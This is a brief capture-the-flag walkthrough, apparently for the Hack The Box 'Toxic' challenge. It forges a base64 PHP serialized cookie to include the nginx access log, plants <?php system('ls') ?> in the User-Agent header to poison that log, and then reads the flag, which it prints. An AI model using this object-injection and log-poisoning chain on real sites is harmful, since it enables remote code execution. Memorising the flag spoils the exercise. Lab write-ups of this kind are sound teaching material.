# Toxic - 
```bash
# catch request with burp
```
```bash
take the token
decode Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9 with base64
obtain O:9:"PageModel":1:{s:4:"file" s:15:"/www/index.html";}
```
```bash
encode O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
obtain Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
```
```bash
# send to repeater

```
```bash
change User-Agent
User-Agent: <?php system('ls') ?>
```
```bash
 encode O:9:"PageModel":1:{s:4:"file";s:11:"/flag_fCdOK";} with base64
obtain Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfZkNkT0siO30
```
```bash
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 16 May 2024 14:11:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.15
Content-Length: 31

HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
```

